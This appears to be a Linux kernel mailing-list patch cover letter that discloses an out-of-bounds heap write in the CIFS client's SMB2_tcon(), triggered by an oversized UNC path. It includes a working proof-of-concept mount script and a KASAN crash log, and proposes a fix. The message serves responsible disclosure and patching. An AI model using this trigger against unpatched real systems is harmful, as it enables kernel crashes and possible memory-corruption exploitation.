Received: from zg8tmtyylji0my4xnjeumjiw.icoremail.net (zg8tmtyylji0my4xnjeumjiw.icoremail.net [162.243.161.220])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 30A454FECC0
	for <linux-cifs@vger.kernel.org>; Tue, 13 Oct 2026 17:16:46 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.243.161.220
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791911813; cv=none; b=Y7ThMOd7D4zeKYGGcQW+4P3m4iwflZSeX3pkY4/J+u8OrhKN3HFkrCcS4+sWzxMNKBZhhv5c6Yx7+cZv3vadRbtGL2G/lAQ2mEGpLAp87GGpG2i7Pf9fDkuBXiijRwxyTDgBJrlHDWa9C0pzkXsPdzYPWqcijo/3SbkmOkOzxFY=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791911813; c=relaxed/simple;
	bh=ruBcXbaXm2DC6tcOidN50ud4WPGMW65CXtD5tf6Ldoo=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=eLHwTGbvW576HOsHsVSGS78xU0RRXkLRwqd71yiKmG0Poix6DUkSHvTJlw9f/9gybw8IRODycgd0rwU1aZFh1boPeOHqXzATiakXqwoyU3nMAVvCFv7SWfXuVQfp/6/+EjVLhsecG10dhHSGayuNfSAZpG0c/hdk0z1U5f3rxN0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=lzu.edu.cn; spf=pass smtp.mailfrom=lzu.edu.cn; arc=none smtp.client-ip=162.243.161.220
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=lzu.edu.cn
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=lzu.edu.cn
Received: from enjou-Legion-Y7000P-2019 (unknown [219.141.235.82])
	by app1 (Coremail) with SMTP id ygmowAAHIbteZ85q0L1eAg--.52328S2;
	Wed, 14 Oct 2026 01:16:15 +0800 (CST)
From: Ren Wei <n05ec@lzu.edu.cn>
To: linux-cifs@vger.kernel.org,
	samba-technical@lists.samba.org
Cc: pc@manguebit.org,
	linkinjeon@kernel.org,
	ronniesahlberg@gmail.com,
	sprasad@microsoft.com,
	tom@talpey.com,
	bharathsm@microsoft.com,
	jlayton@kernel.org,
	smfrench@gmail.com,
	bird@lzu.edu.cn,
	rakukuip@gmail.com,
	n05ec@lzu.edu.cn
Subject: [PATCH 0/1] cifs: fix buffer overflow in SMB2_tcon
Date: Wed, 14 Oct 2026 01:16:12 +0800
Message-ID: <cover.1791865501.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: linux-cifs@vger.kernel.org
List-Id: <linux-cifs.vger.kernel.org>
List-Subscribe: <mailto:linux-cifs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-cifs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CM-TRANSID:ygmowAAHIbteZ85q0L1eAg--.52328S2
X-Coremail-Antispam: 1UD129KBjvJXoWxtr43JFy8Ar4xWFyUZrWfAFb_yoWfXw4fpF
	4UKw4IvFW8Cw48XF4agFW7t3WfZ3y7AayrZrZrCF47AwsrX348Za4Utr1j9F9xtr4UAr17
	Ja4jqFyYgr1jyw7anT9S1TB71UUUUU7qnTZGkaVYY2UrUUUUjbIjqfuFe4nvWSU5nxnvy2
	9KBjDU0xBIdaVrnRJUUUBF1xkIjI8I6I8E6xAIw20EY4v20xvaj40_Wr0E3s1l1IIY67AE
	w4v_Jr0_Jr4l8cAvFVAK0II2c7xJM28CjxkF64kEwVA0rcxSw2x7M28EF7xvwVC0I7IYx2
	IY67AKxVWUJVWUCwA2z4x0Y4vE2Ix0cI8IcVCY1x0267AKxVW8JVWxJwA2z4x0Y4vEx4A2
	jsIE14v26r4j6F4UM28EF7xvwVC2z280aVCY1x0267AKxVW8JVW8Jr1le2I262IYc4CY6c
	8Ij28IcVAaY2xG8wAqx4xG64xvF2IEw4CE5I8CrVC2j2WlYx0E2Ix0cI8IcVAFwI0_Jr0_
	Jr4lYx0Ex4A2jsIE14v26r1j6r4UMcvjeVCFs4IE7xkEbVWUJVW8JwACjcxG0xvY0x0EwI
	xGrwACjI8F5VA0II8E6IAqYI8I648v4I1lFIxGxcIEc7CjxVA2Y2ka0xkIwI1lc7CjxVAa
	w2AFwI0_Jw0_GFylc2xSY4AK67AK6r4l42xK82IYc2Ij64vIr41l42xK82IY6x8ErcxFaV
	Av8VW8WwCFx2IqxVCFs4IE7xkEbVWUJVW8JwC20s026c02F40E14v26r1j6r18MI8I3I0E
	7480Y4vE14v26r106r1rMI8E67AF67kF1VAFwI0_Jw0_GFylIxkGc2Ij64vIr41lIxAIcV
	C0I7IYx2IY67AKxVWUJVWUCwCI42IY6xIIjxv20xvEc7CjxVAFwI0_Gr0_Cr1lIxAIcVCF
	04k26cxKx2IYs7xG6r1j6r1xMIIF0xvEx4A2jsIE14v26r1j6r4UMIIF0xvEx4A2jsIEc7
	CjxVAFwI0_Gr0_Gr1UYxBIdaVFxhVjvjDU0xZFpf9x0JUcyCJUUUUU=
X-CM-SenderInfo: zqqvvuo6o23hxhgxhubq/1tbiAQ0SCWrMObgYqAABsB

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an out-of-bounds write issue in
fs/smb/client/smb2pdu.c. The bug can be triggered by mounting a CIFS share
with an oversized UNC path string, leading to a slab-out-of-bounds write.
We have tested it, and it should not affect any other functionality.

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

=== details below ===

Bug details:

In SMB2_tcon(), unc_path is allocated with a fixed buffer size of
MAX_SHARENAME_LENGTH * 2 bytes (672 bytes). However, the user-controlled
UNC path (tree) length is passed to cifs_strtoUTF16(), which assumes the
destination buffer is large enough and writes strlen(tree) + 1 UTF-16 code
units.

Commit 62a1a439e0fd ("cifs: clean up handling of unc= option") removed the
length check on UNC mount options, allowing mount paths to exceed
MAX_SHARENAME_LENGTH while retaining the fixed-size buffer allocation in
SMB2_tcon(). Consequently, an oversized UNC string causes cifs_strtoUTF16()
to write past the end of the heap object, resulting in a slab-out-of-bounds
write.

Fix this by dynamically allocating unc_path based on the length of tree so
that it safely accommodates all UTF-16 code units.

Reproducer:

The reproducer sets up a minimal SMB2 server responding to tree connect,
and mounts a CIFS share using a 500-byte hostname in the UNC path.

1. Start the minimal mock SMB2 server:
   python3 mock_smb2_server.py 41454

2. In the guest (as root), execute poc.sh:
   HOST_PORT=41454 ./poc.sh

We run the PoC in an x86 QEMU environment.

=== BEGIN poc.sh ===
    #!/bin/sh
    set -eu

    HOST_IP="${HOST_IP:-10.0.2.2}"
    HOST_PORT="${HOST_PORT:-41454}"
    HOST_LEN="${HOST_LEN:-500}"
    MNT="${MNT:-/mnt/cifs_test}"

    LONG_HOST="$(python3 - <<'PY' "$HOST_LEN"
    import sys
    print("H" * int(sys.argv[1]), end="")
    PY
    )"

    UNC="//${LONG_HOST}/x"
    OPTS="vers=2.1,port=${HOST_PORT},ip=${HOST_IP},"
    OPTS="${OPTS}username=u,password=p,nodfs"

    mkdir -p "$MNT"
    umount -f "$MNT" >/dev/null 2>&1 || true

    echo "Triggering with UNC length ${#UNC}"
    echo "source=${UNC}"
    echo "options=${OPTS}"

    mount -t cifs "$UNC" "$MNT" -o "$OPTS"
=== END poc.sh ===

=== BEGIN crash log ===
[  338.863874] [  T10480] BUG: KASAN: slab-out-of-bounds in utf8s_to_utf16s+0x2c1/0x340
[  338.864117] [  T10480] Write of size 2 at addr ff1100010d43aaa0 by task mount.cifs/10480

[  338.864199] [  T10480] CPU: 2 UID: 0 PID: 10480 Comm: mount.cifs Not tainted 7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
[  338.864211] [  T10480] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  338.864240] [  T10480] Call Trace:
[  338.864273] [  T10480]  <TASK>
[  338.864294] [  T10480]  dump_stack_lvl+0x78/0xe0
[  338.864492] [  T10480]  print_report+0xf7/0x600
[  338.864573] [  T10480]  ? utf8s_to_utf16s+0x2c1/0x340
[  338.864584] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.864659] [  T10480]  ? __virt_addr_valid+0x231/0x420
[  338.864755] [  T10480]  ? utf8s_to_utf16s+0x2c1/0x340
[  338.864767] [  T10480]  kasan_report+0xe4/0x120
[  338.864784] [  T10480]  ? utf8s_to_utf16s+0x2c1/0x340
[  338.864811] [  T10480]  utf8s_to_utf16s+0x2c1/0x340
[  338.864830] [  T10480]  ? __pfx_utf8s_to_utf16s+0x10/0x10
[  338.864859] [  T10480]  cifs_strtoUTF16+0x30a/0x3c0
[  338.864906] [  T10480]  ? __pfx_cifs_strtoUTF16+0x10/0x10
[  338.864923] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.864941] [  T10480]  SMB2_tcon+0x1eb/0x1650
[  338.864987] [  T10480]  ? __pfx_SMB2_tcon+0x10/0x10
[  338.864997] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.865034] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.865042] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.865057] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.865070] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.865089] [  T10480]  ? cifs_get_tcon+0x836/0x2180
[  338.865110] [  T10480]  cifs_get_tcon+0x836/0x2180
[  338.865133] [  T10480]  cifs_mount_get_tcon+0x138/0xb10
[  338.865144] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.865153] [  T10480]  ? cifs_mount_get_session+0xc4/0x3f0
[  338.865168] [  T10480]  dfs_mount_share+0x968/0x2370
[  338.865196] [  T10480]  ? __pfx_stack_trace_save+0x10/0x10
[  338.865272] [  T10480]  ? check_path.constprop.0+0x24/0x50
[  338.865337] [  T10480]  ? __pfx_dfs_mount_share+0x10/0x10
[  338.865354] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.865362] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.865371] [  T10480]  ? __lock_acquire+0x1025/0x25f0
[  338.865407] [  T10480]  cifs_mount+0xb6/0xcf0
[  338.865425] [  T10480]  ? __pfx_cifs_mount+0x10/0x10
[  338.865450] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.865459] [  T10480]  ? cifs_setup_cifs_sb+0x3ec/0x7b0
[  338.865476] [  T10480]  cifs_smb3_do_mount+0x251/0x1680
[  338.865501] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.865510] [  T10480]  ? vfs_parse_fs_qstr+0x12d/0x1a0
[  338.865562] [  T10480]  ? lockdep_hardirqs_on+0x7b/0x110
[  338.865599] [  T10480]  ? __pfx_cifs_smb3_do_mount+0x10/0x10
[  338.865647] [  T10480]  smb3_get_tree+0x39d/0x8f0
[  338.865659] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.865675] [  T10480]  vfs_get_tree+0x8d/0x320
[  338.865722] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.865730] [  T10480]  ? security_capable+0x8a/0x150
[  338.865841] [  T10480]  fc_mount+0x15/0x1d0
[  338.865881] [  T10480]  path_mount+0x58d/0x1e00
[  338.865914] [  T10480]  ? __pfx_path_mount+0x10/0x10
[  338.865924] [  T10480]  ? kasan_quarantine_put+0x10a/0x240
[  338.865932] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.865950] [  T10480]  ? user_path_at+0x43/0x50
[  338.866014] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.866036] [  T10480]  ? kmem_cache_free+0x2a6/0x6f0
[  338.866089] [  T10480]  ? __x64_sys_mount+0x210/0x270
[  338.866097] [  T10480]  __x64_sys_mount+0x210/0x270
[  338.866110] [  T10480]  ? __pfx___x64_sys_mount+0x10/0x10
[  338.866124] [  T10480]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.866133] [  T10480]  ? rcu_is_watching+0x12/0xc0
[  338.866167] [  T10480]  do_syscall_64+0x116/0xf80
[  338.866189] [  T10480]  ? irqentry_exit+0x117/0x830
[  338.866205] [  T10480]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  338.866215] [  T10480] RIP: 0033:0x7fd6c0bfa6ca
[  338.866265] [  T10480] Code: 48 8b 0d 49 37 0d 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 49 89 ca b8 a5 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 16 37 0d 00 f7 d8 64 89 01 48
[  338.866272] [  T10480] RSP: 002b:00007ffd70fb3898 EFLAGS: 00000202 ORIG_RAX: 00000000000000a5
[  338.866310] [  T10480] RAX: ffffffffffffffda RBX: 000055e15e535128 RCX: 00007fd6c0bfa6ca
[  338.866316] [  T10480] RDX: 000055e15e535531 RSI: 000055e15e535597 RDI: 00007ffd70fb5c4d
[  338.866322] [  T10480] RBP: 000055e17c19c0b0 R08: 000055e17c19c0b0 R09: 0000000000000000
[  338.866327] [  T10480] R10: 0000000000000000 R11: 0000000000000202 R12: 000055e17c19d110
[  338.866332] [  T10480] R13: 00007ffd70fb5c4d R14: 000000000000000a R15: 00007fd6c0d15000
[  338.866368] [  T10480]  </TASK>

[  338.866494] [  T10480] Allocated by task 10480:
[  338.866520] [  T10480]  kasan_save_stack+0x33/0x60
[  338.866534] [  T10480]  kasan_save_track+0x14/0x30
[  338.866546] [  T10480]  __kasan_kmalloc+0xaa/0xb0
[  338.866558] [  T10480]  SMB2_tcon+0x1b8/0x1650
[  338.866572] [  T10480]  cifs_get_tcon+0x836/0x2180
[  338.866583] [  T10480]  cifs_mount_get_tcon+0x138/0xb10
[  338.866595] [  T10480]  dfs_mount_share+0x968/0x2370
[  338.866608] [  T10480]  cifs_mount+0xb6/0xcf0
[  338.866619] [  T10480]  cifs_smb3_do_mount+0x251/0x1680
[  338.866631] [  T10480]  smb3_get_tree+0x39d/0x8f0
[  338.866644] [  T10480]  vfs_get_tree+0x8d/0x320
[  338.866656] [  T10480]  fc_mount+0x15/0x1d0
[  338.866669] [  T10480]  path_mount+0x58d/0x1e00
[  338.866681] [  T10480]  __x64_sys_mount+0x210/0x270
[  338.866692] [  T10480]  do_syscall_64+0x116/0xf80
[  338.866722] [  T10480]  entry_SYSCALL_64_after_hwframe+0x77/0x7f

[  338.866741] [  T10480] The buggy address belongs to the object at ff1100010d43a800
                           which belongs to the cache kmalloc-1k of size 1024
[  338.866753] [  T10480] The buggy address is located 0 bytes to the right of
                           allocated 672-byte region [ff1100010d43a800, ff1100010d43aaa0)
=== END crash log ===

Best regards,
Luxiao Xu

Luxiao Xu (1):
  cifs: fix buffer overflow in SMB2_tcon

 fs/smb/client/smb2pdu.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

-- 
2.43.0

